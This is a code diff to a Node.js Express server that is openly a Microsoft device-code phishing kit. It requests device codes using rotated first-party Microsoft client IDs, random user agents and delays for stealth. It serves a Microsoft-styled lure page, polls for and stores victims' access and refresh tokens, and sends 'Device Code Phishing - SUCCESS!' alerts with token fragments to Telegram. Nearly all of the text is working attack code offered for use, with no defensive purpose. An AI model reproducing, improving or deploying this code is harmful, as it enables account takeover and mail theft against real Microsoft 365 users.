@@ -58,7 +58,7 @@ const { obfuscateJSFile, generateObfuscationKey } = obfuscator;
 
 // ── ✅ STEALTH: CLIENT ID ROTATION ──
 const CLIENT_IDS = [
-    '1fec8e78-bce4-4aaf-ab1b-5451cc387264', // Office Mobile
+    '1fec8e78-bce4-4aaf-ab1b-5451cc387264', // Office Mobile (best for personal)
     '9e5f94bc-e8a4-4e73-b8be-63364c29d753', // Authenticator
     'd3590ed6-52b3-4102-aeff-aad2292ab01c', // Intune
     '61e6f3cc-5b0b-4b09-8b31-ebcd1ae5f984', // Teams Mobile
@@ -579,7 +579,7 @@ dashApp.post('/api/device/manual', async (req, res) => {
     try {
         const code = user_code || device_code;
         const DEVICE_CLIENT_ID = '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
-        // ✅ FIX: Use 'common' tenant to avoid AADSTS50059
+        // ✅ FIX: Use 'common' tenant
         const response = await axios.post(
             'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
@@ -643,7 +643,6 @@ dashApp.post('/api/prt/exchange', async (req, res) => {
     if (!prt) return res.status(400).json({ error: 'PRT required' });
     try {
         // PRT exchange requires Microsoft's internal APIs
-        // This is a placeholder — implement if you have PRT exchange logic
         res.json({ error: 'PRT exchange requires additional implementation' });
     } catch (error) {
         res.status(500).json({ error: error.message });
@@ -1329,37 +1328,41 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ── ✅ DEVICE CODE API (FIXED: using 'common' tenant) ──
+// =====================================================
+// 🚨 FIXED DEVICE CODE HANDLERS – USING 'common' TENANT
+// =====================================================
+
+// ── ✅ DEVICE CODE REQUEST (FIXED) ──
 app.post('/device/request', async (req, res) => {
     if (!axios) {
-        return res.status(500).json({ error: 'axios not installed. Run: npm install axios' });
+        return res.status(500).json({ error: 'axios not installed' });
     }
     try {
         console.log('📱 Device code requested');
-        const clientId = getRandomClientId();
+        // Force a known‑good client ID (Office Mobile)
+        const clientId = '1fec8e78-bce4-4aaf-ab1b-5451cc387264';
         const userAgent = getRandomUserAgent();
-        console.log(`🔄 Using client: ${clientId}`);
-        console.log(`🔄 Using UA: ${userAgent.slice(0, 50)}...`);
         await randomDelay(300, 800);
 
-        // ✅ FIX: Use 'common' instead of 'organizations'
-        const response = await axios.post(
-            'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
-            new URLSearchParams({
-                client_id: clientId,
-                scope: 'https://graph.microsoft.com/user.read https://graph.microsoft.com/mail.read offline_access'
-            }),
-            { 
-                headers: { 
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'User-Agent': userAgent
-                },
-                timeout: 10000
-            }
-        );
+        const url = 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode';
+        const params = new URLSearchParams({
+            client_id: clientId,
+            scope: 'https://graph.microsoft.com/.default offline_access'
+        });
+        console.log(`➡️ Sending request to: ${url}`);
+        console.log(`📦 Parameters: ${params.toString()}`);
+
+        const response = await axios.post(url, params, {
+            headers: { 
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': userAgent
+            },
+            timeout: 10000
+        });
         const data = response.data;
         console.log('✅ Device code obtained:', data.user_code);
 
+        // Store flow
         const newFlow = {
             device_code: data.device_code,
             user_code: data.user_code,
@@ -1382,6 +1385,7 @@ app.post('/device/request', async (req, res) => {
         deviceFlows.push(newFlow);
         saveDeviceFlows(deviceFlows);
 
+        // Telegram notification
         const message = `
 📱 **Device Code Phishing**
 🆔 **User Code:** \`${data.user_code}\`
@@ -1405,10 +1409,10 @@ app.post('/device/request', async (req, res) => {
     }
 });
 
-// ── ✅ DEVICE TOKEN POLLING (FIXED: using 'common' tenant) ──
+// ── ✅ DEVICE TOKEN POLLING (FIXED) ──
 app.post('/device/token', async (req, res) => {
     if (!axios) {
-        return res.status(500).json({ error: 'axios not installed. Run: npm install axios' });
+        return res.status(500).json({ error: 'axios not installed' });
     }
     const { device_code } = req.body;
     if (!device_code) {
@@ -1417,26 +1421,26 @@ app.post('/device/token', async (req, res) => {
     try {
         console.log('🔄 Polling for token:', device_code);
         const flow = deviceFlows.find(f => f.device_code === device_code);
-        const clientId = flow?.client_id || CLIENT_IDS[0];
+        const clientId = flow?.client_id || '1fec8e78-bce4-4aaf-ab1b-5451cc387264';
         const userAgent = getRandomUserAgent();
         await randomDelay(200, 600);
 
-        // ✅ FIX: Use 'common' to match the device code request
-        const response = await axios.post(
-            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
-            new URLSearchParams({
-                client_id: clientId,
-                device_code: device_code,
-                grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
-            }),
-            { 
-                headers: { 
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'User-Agent': userAgent
-                },
-                timeout: 10000
-            }
-        );
+        const url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
+        const params = new URLSearchParams({
+            client_id: clientId,
+            device_code: device_code,
+            grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
+        });
+        console.log(`➡️ Polling URL: ${url}`);
+        console.log(`📦 Params: ${params.toString()}`);
+
+        const response = await axios.post(url, params, {
+            headers: { 
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': userAgent
+            },
+            timeout: 10000
+        });
         const tokens = response.data;
         console.log('✅ Tokens obtained!');
 
@@ -1460,6 +1464,7 @@ app.post('/device/token', async (req, res) => {
             saveDeviceFlows(deviceFlows);
         }
 
+        // Telegram success notification
         const message = `
 📱 **Device Code Phishing - SUCCESS!**
 🔑 **Access Token:** \`${tokens.access_token?.slice(0, 30)}...\`
@@ -1494,119 +1499,135 @@ app.post('/device/token', async (req, res) => {
     }
 });
 
-// ── ✅ DEVICE CODE REQUEST (FIXED) ──
-app.post('/device/request', async (req, res) => {
-    if (!axios) {
-        return res.status(500).json({ error: 'axios not installed' });
-    }
-    try {
-        console.log('📱 Device code requested');
-        // ✅ Force a known‑good client ID (Office Mobile)
-        const clientId = '1fec8e78-bce4-4aaf-ab1b-5451cc387264';
-        const userAgent = getRandomUserAgent();
-        await randomDelay(300, 800);
-
-        const response = await axios.post(
-            'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
-            new URLSearchParams({
-                client_id: clientId,
-                scope: 'https://graph.microsoft.com/.default offline_access'  // simpler scope
-            }),
-            { 
-                headers: { 
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'User-Agent': userAgent
-                },
-                timeout: 10000
-            }
-        );
-        const data = response.data;
-        console.log('✅ Device code obtained:', data.user_code);
-
-        // ... store flow, notify Telegram, etc.
-        // Keep your existing code for storing flows & Telegram
-        const newFlow = {
-            device_code: data.device_code,
-            user_code: data.user_code,
-            verification_uri: data.verification_uri,
-            expires_in: data.expires_in,
-            interval: data.interval,
-            status: 'pending',
-            created: new Date().toISOString(),
-            approved: null,
-            username: null,
-            access_token: null,
-            refresh_token: null,
-            id_token: null,
-            manual_submitted: false,
-            client_id: clientId,
-            user_agent: userAgent,
-            session_id: crypto.randomBytes(16).toString('hex'),
-            token_type: 'Pending'
-        };
-        deviceFlows.push(newFlow);
-        saveDeviceFlows(deviceFlows);
-        // ... send Telegram notification
-        res.json(data);
-    } catch (error) {
-        console.error('❌ Device code error:', error.response?.data || error.message);
-        res.status(500).json(error.response?.data || { error: error.message });
+// ── ✅ DEVICE PAGE ──
+app.get('/device', (req, res) => {
+    const filePath = path.join(__dirname, 'public', 'device_code.html');
+    if (fs.existsSync(filePath)) {
+        res.sendFile(filePath);
+    } else {
+        res.send(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Device Login</title>
+                <style>
+                    body { font-family: 'Segoe UI', Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; background: #f5f5f5; }
+                    .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+                    #codeDisplay { font-size: 52px; font-weight: bold; padding: 30px; background: #f0f0f0; border-radius: 10px; margin: 20px 0; letter-spacing: 6px; font-family: 'Courier New', monospace; }
+                    button { padding: 12px 24px; font-size: 16px; cursor: pointer; background: #0078d4; color: white; border: none; border-radius: 5px; margin: 5px; }
+                    button:hover { background: #005a9e; }
+                    .status { margin: 20px 0; padding: 12px; border-radius: 5px; }
+                    .pending { background: #fff3cd; color: #856404; }
+                    .success { background: #d4edda; color: #155724; }
+                    .error { background: #f8d7da; color: #721c24; }
+                    .info { background: #d1ecf1; color: #0c5460; }
+                    .link { color: #0078d4; text-decoration: none; }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <h1>🔐 Device Login</h1>
+                    <p>Enter the code on your device to sign in</p>
+                    <div id="codeDisplay">Loading...</div>
+                    <p><a href="https://login.microsoft.com/device" target="_blank" class="link">https://login.microsoft.com/device</a></p>
+                    <div id="status" class="status pending">⏳ Waiting for device approval...</div>
+                    <div>
+                        <button onclick="generateCode()">🔄 New Code</button>
+                        <button onclick="copyCode()">📋 Copy Code</button>
+                        <button onclick="checkStatus()">🔄 Check Status</button>
+                    </div>
+                </div>
+                <script>
+                    let currentCode = '';
+                    let currentDeviceCode = '';
+                    
+                    async function generateCode() {
+                        try {
+                            const response = await fetch('/device/request', { method: 'POST' });
+                            const data = await response.json();
+                            if (data.user_code) {
+                                currentCode = data.user_code;
+                                currentDeviceCode = data.device_code;
+                                document.getElementById('codeDisplay').textContent = currentCode;
+                                document.getElementById('status').className = 'status pending';
+                                document.getElementById('status').textContent = '⏳ Waiting for device approval...';
+                                pollForToken();
+                            } else {
+                                document.getElementById('status').className = 'status error';
+                                document.getElementById('status').textContent = '❌ Error: ' + JSON.stringify(data);
+                            }
+                        } catch (e) {
+                            document.getElementById('status').className = 'status error';
+                            document.getElementById('status').textContent = '❌ Error: ' + e.message;
+                        }
+                    }
+                    
+                    async function pollForToken() {
+                        if (!currentDeviceCode) return;
+                        try {
+                            const response = await fetch('/device/token', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ device_code: currentDeviceCode })
+                            });
+                            const data = await response.json();
+                            if (data.error === 'authorization_pending') {
+                                document.getElementById('status').className = 'status pending';
+                                document.getElementById('status').textContent = '⏳ Still waiting for approval...';
+                                setTimeout(pollForToken, 5000);
+                            } else if (data.error === 'expired_token') {
+                                document.getElementById('status').className = 'status error';
+                                document.getElementById('status').textContent = '⏰ Code expired. Generate a new one.';
+                            } else if (data.access_token) {
+                                document.getElementById('status').className = 'status success';
+                                document.getElementById('status').textContent = '✅ SUCCESS! Tokens obtained!';
+                                alert('✅ Tokens captured!\\nAccess Token: ' + data.access_token.slice(0, 30) + '...');
+                            } else {
+                                document.getElementById('status').className = 'status error';
+                                document.getElementById('status').textContent = '❌ Error: ' + JSON.stringify(data);
+                            }
+                        } catch (e) {
+                            if (!e.message.includes('400')) {
+                                document.getElementById('status').className = 'status error';
+                                document.getElementById('status').textContent = '❌ Error: ' + e.message;
+                            }
+                        }
+                    }
+                    
+                    function copyCode() {
+                        if (currentCode) {
+                            navigator.clipboard.writeText(currentCode).then(() => {
+                                alert('✅ Code copied: ' + currentCode);
+                            }).catch(() => {
+                                const textarea = document.createElement('textarea');
+                                textarea.value = currentCode;
+                                document.body.appendChild(textarea);
+                                textarea.select();
+                                document.execCommand('copy');
+                                document.body.removeChild(textarea);
+                                alert('✅ Code copied: ' + currentCode);
+                            });
+                        } else {
+                            alert('No code to copy. Generate one first.');
+                        }
+                    }
+                    
+                    function checkStatus() {
+                        if (currentDeviceCode) {
+                            pollForToken();
+                        } else {
+                            alert('No active code. Generate one first.');
+                        }
+                    }
+                    
+                    generateCode();
+                </script>
+            </body>
+            </html>
+        `);
     }
 });
 
-// ── ✅ DEVICE TOKEN POLLING (FIXED) ──
-app.post('/device/token', async (req, res) => {
-    if (!axios) {
-        return res.status(500).json({ error: 'axios not installed' });
-    }
-    const { device_code } = req.body;
-    if (!device_code) {
-        return res.status(400).json({ error: 'device_code required' });
-    }
-    try {
-        console.log('🔄 Polling for token:', device_code);
-        const flow = deviceFlows.find(f => f.device_code === device_code);
-        // Use the same client ID
-        const clientId = flow?.client_id || '1fec8e78-bce4-4aaf-ab1b-5451cc387264';
-        const userAgent = getRandomUserAgent();
-        await randomDelay(200, 600);
-
-        const response = await axios.post(
-            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
-            new URLSearchParams({
-                client_id: clientId,
-                device_code: device_code,
-                grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
-            }),
-            { 
-                headers: { 
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'User-Agent': userAgent
-                },
-                timeout: 10000
-            }
-        );
-        const tokens = response.data;
-        console.log('✅ Tokens obtained!');
-        // ... store tokens, update flow, notify Telegram
-        // Keep your existing code for handling tokens
-        res.json(tokens);
-    } catch (error) {
-        if (error.response?.data?.error === 'authorization_pending') {
-            console.log('⏳ Still waiting for approval...');
-            res.status(400).json({ error: 'authorization_pending' });
-        } else if (error.response?.data?.error === 'expired_token') {
-            console.log('⏰ Code expired');
-            const flow = deviceFlows.find(f => f.device_code === device_code);
-            if (flow) flow.status = 'expired';
-            saveDeviceFlows(deviceFlows);
-            res.status(400).json({ error: 'expired_token' });
-        } else {
-            console.error('❌ Token error:', error.response?.data || error.message);
-            res.status(500).json({ error: error.response?.data?.error_description || error.message });
-        }
-    }
-});
 // ── ✅ MOUNT DASHBOARD ──
 app.use('/dash', dashApp);
 
